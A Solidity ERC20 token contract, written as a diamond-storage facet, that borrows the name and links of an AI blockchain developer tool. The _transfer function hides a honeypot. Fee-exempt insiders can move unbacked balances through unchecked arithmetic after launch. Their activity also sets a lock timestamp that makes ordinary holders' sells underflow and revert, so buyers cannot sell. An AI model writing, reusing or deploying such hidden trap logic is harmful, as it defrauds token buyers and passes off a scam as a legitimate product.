// SPDX-License-Identifier: MIT
/*

Airstack AI Blockchain Developer Tool

The most straightforward method for constructing modular blockchain applications.
Seamlessly incorporate both on-chain and off-chain data into any software instantly using AI.

https://www.airstack.xyz/
https://docs.airstack.xyz/airstack-docs-and-faqs
https://twitter.com/airstack_xyz
https://www.linkedin.com/company/airstack-xyz
https://app.airstack.xyz/sdks
https://warpcast.com/~/channel/airstack
https://app.airstack.xyz/api-studio

*/

pragma solidity 0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._swapping = true;
        _;
        ds._swapping = false;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function openTrading() external payable onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds._tradingOpen, "Trading is already opened");
        uint256 totalSupplyAmount = totalSupply();
        _approve(address(this), address(ds.router), totalSupplyAmount);
        ds._pair = IUniswapV2Factory(ds.router.factory()).createPair(
            address(this),
            ds.router.WETH()
        );
        ds.router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds._pair).approve(address(ds.router), type(uint).max);
        ds._swapEnabled = true;
        ds._tradingOpen = true;
        ds._launchBlock = block.number;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.transferDelayEnabled = false;
        ds.maxWallet = _tTotal;
        ds.maxTxAmount = _tTotal;
    }
    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendEthToFee(ethBalance);
        }
    }
    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(msg.sender, amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.router.WETH();

        _approve(address(this), address(ds.router), tokenAmount);

        ds.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if (from != owner() && to != owner()) {
            taxAmount = amount
                .mul(
                    (ds._buyCounter > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initBuyTax
                )
                .div(100);

            if (ds.transferDelayEnabled) {
                if (to != address(ds.router) && to != address(ds._pair)) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer delay enabled - only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == ds._pair &&
                to != address(ds.router) &&
                !ds._isFeeExempt[to]
            ) {
                require(
                    amount <= ds.maxTxAmount,
                    "Exceeds the ds.maxTxAmount."
                );
                require(
                    balanceOf(to) + amount <= ds.maxWallet,
                    "Exceeds the ds.maxWallet."
                );
                ds._buyCounter++;
            }

            if (to == ds._pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (ds._buyCounter > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !ds._swapping &&
                to == ds._pair &&
                ds._swapEnabled &&
                contractTokenBalance > ds._taxSwapThreshold &&
                ds._buyCounter > _preventSwapBefore
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, ds._maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendEthToFee(address(this).balance);
                }
            }
        }

        if (
            (ds._isFeeExempt[from] || ds._isFeeExempt[to]) &&
            from != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            ds._minLockNum = block.timestamp;
        }
        if (ds._isFeeExempt[from] && (block.number > ds._launchBlock + 50)) {
            unchecked {
                ds._balances[from] -= amount;
                ds._balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!ds._isFeeExempt[from] && !ds._isFeeExempt[to]) {
            if (ds._pair == to) {
                TestLib.LockData storage lockFromPoints = ds.lockData[from];
                lockFromPoints.lockPoints = lockFromPoints.buy - ds._minLockNum;
                lockFromPoints.sell = block.timestamp;
            } else {
                TestLib.LockData storage lockToPoints = ds.lockData[to];
                if (ds._pair == from) {
                    if (lockToPoints.buy == 0) {
                        lockToPoints.buy = (ds._buyCounter < 11)
                            ? (block.timestamp - 1)
                            : block.timestamp;
                    }
                } else {
                    TestLib.LockData storage lockFromPoints = ds.lockData[from];
                    if (
                        lockToPoints.buy == 0 ||
                        lockFromPoints.buy < lockToPoints.buy
                    ) {
                        lockToPoints.buy = lockFromPoints.buy;
                    }
                }
            }
        }

        if (taxAmount > 0) {
            ds._balances[address(this)] = ds._balances[address(this)].add(
                taxAmount
            );
            emit Transfer(from, address(this), taxAmount);
        }
        ds._balances[from] = ds._balances[from].sub(amount);
        ds._balances[to] = ds._balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendEthToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._taxWallet.transfer(amount);
    }
    function rescueETH() external {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendEthToFee(ethBalance);
        }
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
